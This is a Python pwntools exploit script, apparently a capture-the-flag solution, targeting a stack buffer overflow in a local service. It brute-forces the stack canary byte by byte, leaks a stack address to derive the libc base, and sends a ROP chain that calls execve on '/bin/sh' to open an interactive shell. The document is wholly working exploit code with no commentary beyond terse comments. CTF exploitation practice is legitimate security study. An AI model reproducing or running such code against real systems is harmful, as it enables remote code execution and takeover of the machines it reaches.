#!/usr/bin/env python3
from pwn import *

libc = ELF("./libc.so.6")
r = remote("0", 10001)

#######################
#     LEAK CANARY     #
#######################
canary = [0x00]
r.recvuntil(b"> ")
for i in range(7):
    for j in range(0x100):
        payload = b"A" * 40 
        payload += b"".join(p8(b) for b in canary) # num to byte in canary
        payload += p8(j) #byte to bruteforce
        r.send(payload)
        if b"*** stack smashing detected ***" not in r.recvuntil(b"> "):
            log.success(f"Byte found: {hex(j)}")
            canary.append(j)
            break

canary = u64(bytes(canary))
log.success(f"Canary found: {hex(canary)}")

######################
#     Stack LEAK     #
######################
stack = [0x90]
for i in range(0x10):
    payload = b"A" * 40 + p64(canary) + p64(0x0)
    payload += b"".join(p8(b) for b in stack)  # send byte 0x90
    payload += p8(i << 4 | 0xd90 >> 8)         # send byte 0x<i>d
    r.send(payload)
    if b"Segmentation fault" not in r.recvuntil(b"> "):
        log.success(f"Stack found {hex(i << 12 | 0xd90)}")
        stack.append(i << 4 | 0xd90 >> 8)   # concatenation 0x<i>d90     
        break


for k in range(4):
    for j in range(0x100):
        payload = b"A" * 40 + p64(canary) + p64(0x0)
        payload += b"".join(p8(b) for b in stack)  # send byte 0x<i>d90
        payload += p8(j)     # Send byte: 0x<j>
        r.send(payload)
        if b"Segmentation fault" not in r.recvuntil(b"> "):
            log.success(f"Stack found {hex(j)}")
            stack.append(j)   # concatenation 0x<j>    
            break
stack.append(0)
stack.append(0)
stack_addr = u64(bytes(stack))
log.success(f"Stack found: {hex(stack_addr)}")

libc.address = stack_addr - 171408
log.success(f"LIBC Base: {hex(libc.address)}")

##################
#   ROP gadget   #
##################
pop_rdi = 0x000000000002a3e5 + libc.address
ret = pop_rdi + 1
pop_rsi = 0x000000000002be51 + libc.address
pop_rdx_rbx = 0x0000000000090529 + libc.address

context.log_level = "DEBUG"
payload = b"A" * 40 + p64(canary) + p64(0x0) 
payload += p64(ret)
payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
payload += p64(pop_rsi) + p64(0x0)
payload += p64(pop_rdx_rbx) + p64(0x0) + p64(0x0)
payload += p64(libc.sym["execve"])

r.sendline(payload)
r.interactive()